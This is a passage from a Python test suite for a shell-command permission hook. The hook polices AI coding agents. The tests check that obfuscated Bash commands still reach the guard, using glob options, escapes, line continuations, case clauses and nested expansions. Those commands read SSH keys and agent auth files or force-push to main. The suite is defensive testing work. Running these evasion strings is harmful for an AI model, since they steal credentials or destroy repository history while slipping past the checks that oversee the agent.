                            "shopt -s $'\\x6eocaseglob'; cat ~/.SS?/id_rsa",
                            "shopt -s extglob; cat ~/@(.ssh|other)/id_rsa",
                            "shopt -s extglob; cat ~/.s@(sh|foo bar)/id_rsa",
                            "shopt -s extglob; cat ~/.c@(odex|foo; bar)/auth.json",
                            'cd "$X"; shopt -s nocaseglob; cat .SS?/id_rsa',
                            'cd "$X"; shopt -s extglob; cat @(.ssh|other)/id_rsa',
                            "shopt -s extglob; cat ~/+(x|.ssh)/../.ssh/id_rsa"):
                with self.subTest(role=role, command=command):
                    current, _ = self.approved(policy, command)
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
            for inherited, command in (("nocaseglob", "cat ~/.SS?/id_rsa"),
                                        ("extglob", "cat ~/@(.ssh|other)/id_rsa")):
                with self.subTest(inherited=inherited), patch.dict(os.environ, {"BASHOPTS": inherited}):
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, policy, None))
            with patch.dict(os.environ, {"BASHOPTS": "", "GLOBIGNORE": ""}):
                self.assertIsNone(sp.protected_reason("Bash", {"command": "cat ~/.SS?/id_rsa"}, policy, None))
            for command in ("shopt -s nocaseglob; cat /outside/api/*.JSON",
                            "shopt -s extglob; cat /outside/api/@(schema|types).json"):
                with self.subTest(command=command):
                    self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                    current, _ = self.approved(policy, command)
                    self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_rev011_rev012_bash_fixture_paths_reach_the_guard(self):
        # Only disposable names are expanded; no real credential is read.
        with tempfile.TemporaryDirectory() as root:
            home = Path(root, "home")
            store = home / ".ssh"
            store.mkdir(parents=True)
            (store / "id_rsa").touch()
            cases = (("shopt -s dot\\\nglob; ", "~/*/id_rsa"),
                     ('shopt -s "dot""glob"; ', "~/*/id_rsa"),
                     ("shopt -s $'\\x64otglob'; ", "~/*/id_rsa"),
                     ("CD\\\nPATH=~ cd .ssh; ", '"$PWD/id_rsa"'),
                     ('export "CD""PATH=~"; cd .ssh; ', '"$PWD/id_rsa"'),
                     ('HO\\\nME="$X" cd; ', '"$PWD/id_rsa"'),
                     ('cd /tmp; export "OLD""PWD=$X"; cd -; ', '"$PWD/id_rsa"'),
                     ('shopt -s "nocase""glob"; ', "~/.SS?/id_rsa"),
                     ("shopt -s extglob; ", "~/@(.ssh|other)/id_rsa"),
                     ("shopt -s extglob; ", "~/.s@(sh|foo bar)/id_rsa"))
            environment = {**os.environ, "HOME": str(home), "X": str(store), "CDPATH": "", "GLOBIGNORE": ""}
            with patch.dict(os.environ, environment), patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                for prefix, operand in cases:
                    with self.subTest(prefix=prefix):
                        baseline = subprocess.run(["bash", "--noprofile", "--norc", "-O", "extglob", "-c",
                            prefix + "printf '%s\\n' " + operand], cwd=root, env=environment,
                            capture_output=True, text=True)
                        self.assertEqual(0, baseline.returncode, baseline.stderr)
                        self.assertEqual(str(store / "id_rsa"), baseline.stdout.splitlines()[-1])
                        command = prefix + "cat " + operand
                        for role in ("resolve", "rereview"):
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command},
                                sp.StagePolicy(role), root))

    @posix_shell
    def test_rev012_extglob_directory_targets_remain_unresolved(self):
        with tempfile.TemporaryDirectory() as root:
            work = Path(root, "work")
            store = Path(root, "secret/.ssh")
            work.mkdir()
            store.mkdir(parents=True)
            (work / "link").symlink_to(store, target_is_directory=True)
            target = str(work / "@(link)")
            baseline = subprocess.run(["bash", "--noprofile", "--norc", "-O", "extglob", "-c",
                                       "cd " + target + "; pwd -P"], cwd=root, capture_output=True, text=True)
            self.assertEqual((0, str(store)), (baseline.returncode, baseline.stdout.strip()))
            with patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                for role in ("resolve", "rereview"):
                    policy = sp.StagePolicy(role)
                    for program in ("cd", "pushd", "env -C"):
                        suffix = " cat id_rsa" if program == "env -C" else "; cat id_rsa"
                        command = program + " " + target + suffix
                        with self.subTest(role=role, program=program):
                            current, _ = self.approved(policy, command)
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, root))
                            self.assertFalse(sp.check(command, current, cwd=root).allowed)
                    safe = "cd " + target + "; cat schema.json"
                    self.assertTrue(sp.unresolved_directory(safe, policy, root))
                    self.assertIsNone(sp.protected_reason("Bash", {"command": safe}, policy, root))
                    current, _ = self.approved(policy, safe)
                    self.assertTrue(sp.check(safe, current, cwd=root).allowed)

    @posix_shell
    def test_rev013_nested_expansions_do_not_hide_later_segments(self):
        for operator in ("@", "!", "*", "+", "?"):
            for expansion in ("${x:-(}", "${x/(/y}", "$[(1)]", "${x:-${y:-(}}"):
                for comment in ("", " # )"):
                    command = "shopt -s extglob\nls " + operator + "(" + expansion + "); cat ~/.ssh/id_rsa /dev/null" + comment
                    for role in ("resolve", "rereview"):
                        with self.subTest(operator=operator, expansion=expansion, comment=comment, role=role):
                            policy = sp.StagePolicy(role)
                            parsed = sp.parse_command(command, None)
                            self.assertEqual("cat", parsed.segments[-1].words[0])
                            current, _ = self.approved(policy, command)
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                            self.assertFalse(sp.check(command, current).allowed)

    @posix_shell
    def test_rev013_expansion_substitutions_stay_guarded_and_safe_forms_get_consent(self):
        for role in ("resolve", "rereview"):
            policy = sp.StagePolicy(role)
            grant = grants.make_pattern_grant(r".+", role, "claude", "linux", compound=True,
                proposer="test", justification="exercise retained guards",
                positive=["printf hello | cat"], negative=["\n"])
            current = replace(policy, command_permissions=({"operation": grant.operation, "decision": "allow"},))
            for expansion in ("${x:-(}", "${x/(/y}", "$[(1)]", "${x:-$(cat ~/.ssh/id_rsa)}",
                              "${x:-$[1 + $(cat ~/.ssh/id_rsa)]}"):
                command = "shopt -s extglob\nls @(" + expansion + "); cat ~/.ssh/id_rsa # )"
                with self.subTest(role=role, expansion=expansion):
                    self.assertIsNone(sp.matching_answer("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
                    self.assertIsNone(cp.refused_operation([command], current,
                        grants.ConsentBroker("owner/repo", platform="linux"), "claude"))
            for expansion in ("${x:-$(git push --force origin main)}", "$[1 + $(git push --force origin main)]"):
                command = "ls @(" + expansion + ")"
                with self.subTest(role=role, expansion=expansion):
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
            for expansion in ('${x:-$(printf ")"; git push --force origin main)}',
                              '$[1 + $(printf ")"; git push --force origin main)]',
                              '${x:-${y:-$(printf ")"; git push --force origin main)}}',
                              '${x:-`printf ")"; git push --force origin main`}',
                              "${x:-$'\\\'})(\'$(printf \" )\"; git push --force origin main)}",
                              "${x:-${y:-a}$\\\n'\\\'})(\'$(printf \" )\"; git push --force origin main)}",
                              '${x:-$(printf x # )\ngit push --force origin main\n)}',
                              '${x:-$(cat <<EOF\n)\nEOF\ngit push --force origin main\n)}'):
                command = "shopt -s extglob\nprintf '%s' @(" + expansion + ")"
                with self.subTest(role=role, expansion=expansion), tempfile.TemporaryDirectory() as root:
                    # Keep the cwd away from stores so the outer brace operand
                    # cannot mask a lost substitution's Git guard.
                    self.assertIn("git", str(sp.protected_reason("Bash", {"command": command}, current, root)).lower())
                    self.assertFalse(sp.check(command, current, cwd=root).allowed)
            # Slash-bearing brace operands retain the existing conservative
            # credential guard (PA-28); they are not benign-consent examples.
            for expansion in ("${x:-(}", "$[(1)]", "${x:-${y:-(}}",
                              "${x:-\"}\"}", "${x:-\\}}", "${x:-$'('}"):
                command = "ls /outside/api/@(" + expansion + "); printf done"
                with self.subTest(role=role, expansion=expansion):
                    self.assertEqual("printf", sp.parse_command(command, None).segments[-1].words[0])
                    self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                    self.assertIsNotNone(cp.refused_operation([command], policy,
                        grants.ConsentBroker("owner/repo", platform="linux"), "claude"))
                    self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_rev013_escaped_space_does_not_start_a_shell_comment(self):
        commands = ('(printf "%s\\n" "$(printf a\\ #)"; git push --force origin main\ntrue )',
                    '(printf "%s\\n" "$(printf a\\ #)"; git push --force origin main\ntrue ) # )',
                    '(printf "%s\\n" "$(printf a\\ #)"; git push --force origin main\ntrue ) # "',
                    'printf "%s" $(printf ""#); git push --force origin main',
                    'printf "%s" $(printf \\ #); git push --force origin main')
        for role in ("resolve", "rereview"):
            for command in commands:
                with self.subTest(role=role, command=command), tempfile.TemporaryDirectory() as root:
                    policy, _ = self.approved(sp.StagePolicy(role), command)
                    self.assertIn("git", str(sp.protected_reason("Bash", {"command": command}, policy, root)).lower())
                    self.assertFalse(sp.check(command, policy, cwd=root).allowed)

    @posix_shell
    def test_rev013_unterminated_extglobs_and_expansions_fail_closed(self):
        for command in ("ls @(foo", "ls @(${x:-(}", "ls @(${x:-foo)", "ls @($[(1))",
                        "ls @(${x:-$(printf x)}", "ls @(${x:-`printf x})"):
            with self.subTest(command=command), self.assertRaisesRegex(sp.PolicyError, "unterminated"):
                sp.parse_command(command, None)
        command = "ls @(" + "${x:-" * 40 + "x" + "}" * 40 + ")"
        with self.assertRaisesRegex(sp.PolicyError, "resource limit"):
            sp.parse_command(command, None)

    @posix_shell
    def test_rev013_bash_fixture_executes_the_later_segment(self):
        # Prove Bash's boundary using a disposable file, never a real store.
        with tempfile.TemporaryDirectory() as root:
            store = Path(root, "fixture-store")
            store.mkdir()
            target = store / "fixture.txt"
            target.write_text("later segment ran\n", encoding="utf-8")
            for operator in ("@", "!", "*", "+", "?"):
                # Older Bash versions count parentheses in the parameter
                # forms differently. Arithmetic expansion reproduces the
                # hidden segment on those versions too; all reported forms
                # retain conservative parser coverage in the test above.
                for expansion in ("$[(1)]",):
                    for comment in ("", " # )"):
                        command = "shopt -s extglob\nls " + operator + "(" + expansion + "); cat " + str(target) + comment
                        with self.subTest(operator=operator, expansion=expansion, comment=comment):
                            baseline = subprocess.run(["bash", "--noprofile", "--norc", "-c", command], cwd=root,
                                env={**os.environ, "x": "", "BASH_ENV": "/dev/null"}, capture_output=True, text=True)
                            self.assertEqual(0, baseline.returncode, baseline.stderr)
                            self.assertTrue(baseline.stdout.endswith("later segment ran\n"), baseline.stdout)
                            with patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                                for role in ("resolve", "rereview"):
                                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, sp.StagePolicy(role), root))

    #: `case` clauses inside substitutions whose later command Bash runs
    #: (REV-014). `{cmd}` is replaced by the hidden command.
    REV014_FORMS = ('printf \'%s\' "$(case a in a) {cmd} ;; esac)"',
                    "echo $(case a in a) {cmd} ;; esac)",
                    "echo $(case a in b) true ;& a) {cmd} ;; esac)",
                    "echo $(case a in a) true ;;& a) {cmd} ;; esac)",
                    "echo $(case a in (a) {cmd} ;; esac)",
                    "echo $(case a in (b) true ;; a | c) {cmd} ;; esac)",
                    "echo $(case a in a) {cmd}\nesac)",
                    "echo $(case a in\n  # comment )\n  a) {cmd} ;;\nesac)",
                    "echo $(true; case a in a) case b in b) {cmd} ;; esac ;; esac)",
                    "echo $( (case a in a) true ;; esac) ; {cmd})",
                    "echo $(if true; then case a in a) {cmd} ;; esac; fi)",
                    "echo $(case \"$(printf a)\" in a) {cmd} ;; esac)",
                    'echo "$(case a in a) true ;; esac)"; {cmd}',
                    "cat <(case a in a) {cmd} ;; esac)",
                    "echo ${x:-$(case a in a) {cmd} ;; esac)}")

    def rev014_grant(self, role, executor):
        grant = grants.make_pattern_grant(r".+", role, executor, "linux", compound=True,
            proposer="test", justification="exercise retained guards",
            positive=["printf hello | cat"], negative=["\n"])
        return replace(sp.StagePolicy(role), command_permissions=({"operation": grant.operation, "decision": "allow"},))

    @posix_shell
    def test_rev014_case_patterns_do_not_end_substitutions(self):
        for executor in ("claude", "codex"):
            for role in ("resolve", "rereview"):
                current = self.rev014_grant(role, executor)
                for form in self.REV014_FORMS:
                    command = form.replace("{cmd}", "git push --force origin main")
                    with self.subTest(executor=executor, role=role, command=command), \
                            tempfile.TemporaryDirectory() as root:
                        parsed = sp.parse_command(command, None)
                        self.assertIn(["git", "push", "--force", "origin", "main"],
                                      [segment.words for segment in parsed.segments])
                        self.assertIn("git", str(sp.protected_reason("Bash", {"command": command}, current, root)).lower())
                        self.assertFalse(sp.check(command, current, cwd=root).allowed)
                        self.assertIsNone(cp.refused_operation([command], current,
                            grants.ConsentBroker("owner/repo", platform="linux"), executor))
                    command = form.replace("{cmd}", "cat ~/.ssh/id_rsa")
                    with self.subTest(executor=executor, role=role, command=command):
                        self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                        self.assertFalse(sp.check(command, current).allowed)

    @posix_shell
    def test_rev014_case_words_as_arguments_keep_their_boundaries(self):
        policy = sp.StagePolicy("resolve")
        for body in ("echo case a in a", "echo then case a in a", "echo \\; case a in a",
                     "echo $(true) case a in a", "printf '%s' esac", "case a in a) printf ok ;; esac"):
            command = 'printf "%s" "$(' + body + ')"; printf done'
            with self.subTest(command=command):
                self.assertEqual(["printf", "done"], sp.parse_command(command, None).segments[-1].words)
                self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
        for command in ("echo $(case a in a", "echo $(case a in a) true ;; esac"):
            with self.subTest(command=command), self.assertRaisesRegex(sp.PolicyError, "unterminated"):
                sp.parse_command(command, None)

    @posix_shell
    def test_rev014_bash_fixture_runs_the_command_after_the_pattern(self):
        # Prove Bash's boundary using a disposable file, never a real store.
        with tempfile.TemporaryDirectory() as root:
            store = Path(root, "fixture-store")
            store.mkdir()
            target = store / "fixture.txt"
            target.write_text("hidden command ran\n", encoding="utf-8")
            for form in self.REV014_FORMS:
                command = form.replace("{cmd}", "cat " + str(target))
                with self.subTest(command=command):
                    baseline = subprocess.run(["bash", "--noprofile", "--norc", "-c", command], cwd=root,
                        env={**os.environ, "BASH_ENV": "/dev/null"}, capture_output=True, text=True)
                    self.assertEqual(0, baseline.returncode, baseline.stderr)
                    self.assertIn("hidden command ran", baseline.stdout)
                    with patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                        for role in ("resolve", "rereview"):
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command},
                                                                     sp.StagePolicy(role), root))

    @posix_shell
    def test_rev012_extglob_data_and_negated_subshells_are_distinct(self):
        policy = sp.StagePolicy("resolve")
        for command in ("!(git push --force origin main)", "true; !(git push --force origin main)",
                        "time -- !(git push --force origin main)",
                        "time -p -- !(git push --force origin main)",
                        "if !(git push --force origin main); then true; fi",
                        "while !(git push --force origin main); do true; done",
                        "cat @(x|$(git push --force origin main))",
                        "cat @(x|`git push --force origin main`)"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        for operand in ("@(a;git push --force origin main)", "@(x|foo bar)",
                        "@(x|foo>bar)", "!(x|foo bar)"):
            command = "printf '%s' " + operand
            with self.subTest(operand=operand):
                self.assertEqual([["printf", "%s", operand]],
                                 [segment.words for segment in sp.parse_command(command, None).segments])
                self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                current, _ = self.approved(policy, command)
                self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_shell_quoting_and_continuations_reach_the_guard_decoded(self):
        policy = sp.StagePolicy("resolve")
        home = str(Path.home())
        for command in (f"cat $'{home}/.ssh/id_rsa'", f"cat $'{home}/.s\\x73h/id_rsa'",
                        f'cat $"{home}/.codex/auth.json"', "cat ~/.s\\\nsh/id_rsa",
                        f'cat "{home}/.co\\\ndex/auth.json"', f"cat {home}/.codex$'\\u2f'auth.json",
                        "cat ~/$'\\u2e'ssh/id_rsa", f"cat {home}/.s$'\\c@'sh/id_rsa",
                        f"cat {home}/.s$'s\\0x'h/id_rsa", f"cat $\\\n'{home}/.ssh/id_rsa'",
                        "cat $HO\\\nME/.ssh/id_rsa", "cat ${HO\\\nME}/.codex/auth.json"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        self.assertEqual([["printf", "a\nb"]], [item.words for item in sp.parse_command("printf $'a\\nb' | cat",
                                                                                         None).segments][:1])
        for safe in ("printf $'%s\\n' done", "echo first \\\n  second", "printf $'\\x \\E[0m\\c'",
                     "find . -print0 | while IFS= read -r -d $'\\0' f; do echo \"$f\"; done",
                     "printf '%s' $'\\x00' | cat", "# note \\\ncat README.md"):
            with self.subTest(command=safe), warnings.catch_warnings():
                warnings.simplefilter("error")
                self.assertIsNone(sp.protected_reason("Bash", {"command": safe}, policy, None))

    @posix_shell
    def test_unresolved_directory_asks_for_project_paths_below_it(self):
        # Code loaders and variable targets make the directory unknown; a
        # nested project path still names no credential store, so it asks.
        for role in ("resolve", "rereview"):
            with self.subTest(role=role), tempfile.TemporaryDirectory() as root:
                policy = sp.StagePolicy(role, tmpdir=root)
                for command in ("source .venv/bin/activate && pytest tests/cli/test_main.py",
                                'eval "$(pyenv init -)" && rm -rf build/*', 'cd "$X" && ls src/*',
                                ". venv/bin/activate && cat app/config/settings.py",
                                'cd "$X" && cat .github/workflows/*.yml',
                                "source .venv/bin/activate && rm -rf build/cache/*",
                                'cd "$X" && cp -r cli/templates "$TMPDIR/t"'):
                    with self.subTest(command=command):
                        self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, root))
                        self.assertTrue(sp.unresolved_directory(command, policy, root))
                        current, _ = self.approved(policy, command, cwd=root)
                        self.assertTrue(sp.check(command, current, cwd=root).allowed)
        policy = sp.StagePolicy("resolve")
        for command in ('cd "$X" && cat keys/id_rsa', 'cd "$X" && cat certs/server.pem',
                        "source x.sh && cat .ssh/*", 'cd "$X" && cat aws/sso/cache/t.json',
                        'cd "$X" && cp -r sso/cache "$TMPDIR/c"', 'cd "$X" && cat keys/*rsa',
                        'cd "$X" && cat sub/id*', 'cd "$X" && cat x/*pem', 'cd "$X" && cat cache/*'):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)

    def test_rev004_invalid_answers_retry_without_saving_rejected_grants(self):
        for role in ("resolve", "rereview"):
            with self.subTest(role=role), tempfile.TemporaryDirectory() as root:
                store = grants.ConsentStore(Path(root) / "consents.json")
                command = "cat /outside/api/schema.json"
                bad = {"answer": "persistent", "pattern": "[", "positive": [command], "negative": ["rm x"]}
                unrelated = {"answer": "persistent", "pattern": r"ls /outside/.+",
                             "positive": ["ls /outside/api"], "negative": ["rm x"]}
                responses = [bad, unrelated]
                responses.append({"answer": "persistent", "pattern": r"cat .+", "positive": 1,
                                  "negative": ["rm x"]})
                if role == "rereview":
                    responses.append({"answer": "forever"})
                responses.append("persistent")
                questions = []
                def prompt(asked):
                    questions.append(asked)
                    self.assertEqual([], store.list("owner/repo"))
                    return responses.pop(0)
                broker = grants.ConsentBroker("owner/repo", platform="linux", store=store, prompt=prompt)
                request = cp.refused_operation([command], sp.StagePolicy(role), broker, "claude")
                grant = broker.operations[request["resource"]]
                self.assertEqual("persistent", broker.request(grant, "claude", role=role, blocker=request))
                self.assertIn("invalid pattern", questions[1]["validation_error"])
                self.assertIn("does not cover", questions[2]["validation_error"])
                self.assertIn("non-empty lists", questions[3]["validation_error"])
                if role == "rereview":
                    self.assertIn("global grant never covers", questions[4]["validation_error"])
                self.assertEqual(1, len(store.list("owner/repo")))
                self.assertEqual(1, len(broker.operations))

    def test_rev004_terminal_json_error_then_eof_leaves_request_pending(self):
        command = "cat /outside/api/schema.json"
        output = io.StringIO()
        prompt = grants.terminal_prompt(io.StringIO('{"answer":"forever"}\n'), output)
        broker = grants.ConsentBroker("owner/repo", platform="linux", prompt=prompt)
        request = cp.refused_operation([command], sp.StagePolicy("rereview"), broker, "claude")
        grant = broker.operations[request["resource"]]
        self.assertEqual(grants.PENDING, broker.request(grant, "claude", role="rereview", blocker=request))
        self.assertIn("global grant never covers", output.getvalue())
        self.assertEqual(1, len(broker.pending))

    @posix_shell
    def test_ac10_patterns_never_lift_protected_guards(self):
        policy = sp.StagePolicy("rereview", tmpdir="/tmp/current")
        current, grant = self.approved(policy, "ls /outside/api", r"(?:git|cat|echo|ls) .+")
        for command in ("git push --force origin main", "cat ~/.codex/auth.json", "echo data > /outside/file"):
            self.assertFalse(sp.check(command, current).allowed)
            self.assertIsNone(sp.matching_answer("Bash", {"command": command}, current, None))

    def test_ac11_hook_label_and_host_note(self):
        with tempfile.TemporaryDirectory() as root:
            policy = sp.StagePolicy("resolve", tmpdir=root)
            path = Path(root) / "policy.json"
            path.write_text(policy.to_json())
            output = io.StringIO()
            sp.hook_main([str(path)], stdin=io.StringIO(json.dumps({
                "tool_name": "Bash", "tool_input": {"command": "unknown-command"}})), stdout=output)
            self.assertIn("[layer=toolkit_hook]", output.getvalue())
            self.assertIn("unlabelled refusal", sp.prompt_note(policy))

    @posix_shell
    def test_ac7_ac9_pattern_proposal_edited_approval_and_real_hook(self):
        with tempfile.TemporaryDirectory() as root:
            store = grants.ConsentStore(Path(root) / "consents.json")
            policy = sp.StagePolicy("resolve", tmpdir=root)
            command = "cat /outside/api/schema.json"
            proposal = {"pattern": r"cat /outside/api/.+", "proposer": "agent",
                        "justification": "inspect API contract", "positive": [command],
                        "negative": ["cat /outside/secrets"]}
            broker = grants.ConsentBroker("owner/repo", store=store, platform="linux",
                prompt=lambda question: {"answer": "persistent", "pattern": r"(?:ls|cat) /outside/api[/a-z.]*",
                    "positive": [command], "negative": ["cat /outside/secrets"]})
            request = cp.refused_operation([{"tool": "Bash", "input": {"command": command},
                "pattern_proposal": proposal}], policy, broker, "claude")
            grant = broker.operations[request["resource"]]
            self.assertEqual(2, grant.operation["version"])
            self.assertEqual("persistent", broker.request(grant, "claude", role="resolve", blocker=request))
            current = replace(policy, command_permissions=broker.command_entries("claude", "resolve"))
            policy_path = Path(root) / "policy.json"
            policy_path.write_text(current.to_json())
            for command, allowed in (("ls /outside/api/", True), ("cat /outside/secrets", False)):
                completed = subprocess.run([sys.executable, str(Path(sp.__file__)), "hook", str(policy_path)],
                    input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": root}),
                    capture_output=True, text=True)
                self.assertEqual(0, completed.returncode)
                self.assertEqual(allowed, completed.stdout == "", completed.stdout)
            broker.record_executions(["ls /outside/api/"], "claude", current, root)
            entries = store.list("owner/repo")
            self.assertEqual(1, len(entries))
            self.assertEqual("ls /outside/api/", entries[0]["executed_commands"][0]["command"])

    def test_ac11_layer_records_include_both_executors(self):
        for executor in ("claude", "codex"):
            records = cp.denial_records([{"tool": "Bash", "input": {"command": "ls /outside/api"},
                "layer": executor + "_permission"}], sp.StagePolicy("resolve"), executor)
            self.assertEqual(executor + "_permission", records[0]["layer"])

    @posix_shell
    def test_ac9_execution_audit_keeps_verified_temporary_identity_after_cleanup(self):
        with tempfile.TemporaryDirectory() as root:
            scratch = Path(root) / "dispatch"
            scratch.mkdir()
            policy = sp.StagePolicy("resolve", tmpdir=str(scratch))
            command = "cat $TMPDIR/output"
            op = sp.operation("Bash", {"command": command}, policy, root)
            grant = grants.make_pattern_grant(r"cat <TMPDIR>/.+", "resolve", "claude", "linux",
                proposer="agent", justification="read check output", positive=["cat <TMPDIR>/output"],
                negative=["cat /outside/file"])
            store = grants.ConsentStore(Path(root) / "consents.json")
            store.save("owner/repo", grant, grant.scopes[0], "allow")
            scratch.rmdir()
            broker = grants.ConsentBroker("owner/repo", store=store, platform="linux")
            broker.record_executions([command], "claude", replace(policy, tmpdir=None), root,
                                     observed=[{"command": command, "operation": op}])
            self.assertEqual(command, store.list("owner/repo")[0]["executed_commands"][0]["command"])

    def test_ac12_documentation_contract(self):
        root = Path(__file__).resolve().parents[1]
        # The docs are UTF-8 (`Í`, `←`); Windows' default code page cannot decode them.
        text = (root / "docs/host-permissions.md").read_text(encoding="utf-8")
        for token in ("command_pattern_proposals", "positive", "negative", "toolkit_hook", "#439"):
            self.assertIn(token, text)
        audit = (root / "docs/capability-parity-audit.md").read_text(encoding="utf-8")
        self.assertIn("PA-19", audit)
        self.assertIn("#439", audit)
        self.assertIn("#455", (root / "docs/ROADMAP_V2.md").read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
